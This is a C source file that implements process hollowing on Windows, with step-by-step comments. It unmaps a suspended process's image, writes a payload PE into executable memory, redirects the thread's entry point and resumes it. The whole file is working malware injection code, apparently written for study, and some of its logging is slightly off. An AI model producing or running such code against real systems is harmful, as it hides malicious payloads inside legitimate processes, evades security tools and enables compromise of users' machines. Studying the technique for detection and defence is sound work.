#include "hollowing.h"
#include <stdio.h>
#include <stdlib.h>

typedef NTSTATUS (WINAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);

BOOL RunProcessHollowing(PPROCESS_INFORMATION pTargetInfo, PPAYLOAD_INFO pPayload) {
    /* Get initial thread context
     * Before we can hollow the process, we need to know where it is.
     * We capture the current state of the main thread's registers.
     */
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pTargetInfo->hThread, &ctx)) {
        fprintf(stderr, "Error: Couldn't get thread context (Error: %lu)\n", GetLastError());
        return FALSE;
    }

    /* Find real image base via PEB
     * ASLR moves the suspended process to a random location. Should find it at the PEB
     * In x64, the RDX register points to the PEB and the image base address is at PEB + 0x10
     * In x86, the EBX register points to the PEB and the image base address is at PEB + 0x08
     */
    ULONG_PTR targetImageBase = 0;
    #ifdef _M_X64
        if (!ReadProcessMemory(pTargetInfo->hProcess, (PVOID)(ctx.Rdx + 0x10),
                &targetImageBase, sizeof(targetImageBase), NULL)) {
                    fprintf(stderr, "Error: Couldn't read image base from PEB (Error: %lu)\n", GetLastError());
                    return FALSE;
        }
    #else
        if (!ReadProcessMemory(pTargetInfo->hProcess, (PVOID)(ctx.Ebx + 0x08),
                &targetImageBase, sizeof(targetImageBase), NULL)) {
                    fprintf(stderr, "Error: Couldn't read image base from PEB (Error: %lu)\n", GetLastError());
                    return FALSE;
        }
    #endif

    printf("Real target image base found via PEB: 0x%p\n", (PVOID)targetImageBase);

    /* Dynamic Linking to ntdll.dll
     * NtUnmapViewOfSection is an undocumented function that disconnects the connection between the section (the file in hard disk) and the virtual page
     * It exists in ntdll.dll but not in the standard headers
     * Must find it's memory address at runtime in order to use it
    */
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    if (NtUnmapViewOfSection == NULL) {
        fprintf(stderr, "Error: Couldn't locate NtUnmapViewOfSection in ntdll.dll\n");
        return FALSE;
    }

    printf("Unmapping target memory at 0x%p...\n", (PVOID)targetImageBase);

    NTSTATUS status = NtUnmapViewOfSection(
        pTargetInfo->hProcess,
        (PVOID)targetImageBase
    );

    if (status != 0) {
        // status 0 mean success
        fprintf(stderr, "Error: Unmapping failed! NTSTATUS: 0x%X\n", status);
        return FALSE;
    }
    printf("Target memory hollowed out successfully!\n");
    
    LPVOID pRemoteAddr = VirtualAllocEx(
        pTargetInfo->hProcess,
        (PVOID)pPayload->imageBase,
        pPayload->imageSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (pRemoteAddr == NULL) {
        fprintf(stderr, "Error: Couldn't allocate memory in target process (Error: %lu)\n", GetLastError());
        return FALSE;
    }

    printf("Allocated %lu bytes at 0x%p in target process\n", pPayload->size, pRemoteAddr);

    if (!WriteProcessMemory(pTargetInfo->hProcess, pRemoteAddr, pPayload->buffer,
        pPayload->nt->OptionalHeader.SizeOfHeaders, NULL)) {
            fprintf(stderr, "Error: Couldn't write headers (Error: %lu)\n", GetLastError());
            return FALSE;
    }

    // write each section of the binary (.text, .data, .bss, etc...)
    for (int i = 0 ; i < pPayload->nt->FileHeader.NumberOfSections ; i++) {
        // Find section header (skip the NT_HEADERS, where we start and then go to the current section)
        PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)(
            (PBYTE)pPayload->nt + 
            sizeof(IMAGE_NT_HEADERS) + 
            i * sizeof(IMAGE_SECTION_HEADER)
        );

        /* Destination address (Remote) 
         * We take the base address of the suspended process and add the VirtualAddress
         * The VirtualAddress is where the code expects to be relative to the start.
         */
        PVOID pSectionDest = (PVOID)((PBYTE)pRemoteAddr + pSectionHeader->VirtualAddress);

        /* Source address (Local Buffer)
         * We take the raw file buffer and add PointerToRawData
         * PointerToRawData is the offset in the binary on the disk where this section's bytes is stored
         */
        PVOID pSectionSrc = (PVOID)((PBYTE)pPayload->buffer + pSectionHeader->PointerToRawData);

        printf("Writing section: %s (%lu bytes) at 0x%p\n", 
            pSectionHeader->Name,
            pSectionHeader->PointerToRawData,
            pSectionDest
        );

        if (!WriteProcessMemory(
            pTargetInfo->hProcess,
            pSectionDest,
            pSectionSrc,
            pSectionHeader->SizeOfRawData,
            NULL
        )) {
            fprintf(stderr, "Error: Couldn't write section %s (Error: %lu)\n", pSectionHeader->Name, GetLastError());
            return FALSE;
        }
    }
    
    printf("Payload successfully injected into target memory!\n");

    /* Hijack the thread context 
     * The program need to tell the CPU to run our code instead of the suspended process's code
     * It'll get the current state of the main thread and change its IP
     */
    #ifdef _M_X64
        ctx.Rcx = (DWORD64)((PBYTE)pRemoteAddr + pPayload->entryPointRVA);
        printf("Setting x64 RIP to: 0x%p\n", (PVOID)ctx.Rcx);
    #else
        ctx.Eax = (DWORD64)((PBYTE)pRemoteAddr + pPayload->entryPointRVA);
        printf("Setting x64 EIP to: 0x%p\n", (PVOID)ctx.Eax);
    #endif

    if (!SetThreadContext(pTargetInfo->hThread, &ctx)) {
        fprintf(stderr, "Error: Couldn't set thread context (Error: %lu)\n", GetLastError());
        return FALSE;
    }
    printf("Resuming thread...\n");
    ResumeThread(pTargetInfo->hThread);
    return TRUE;
}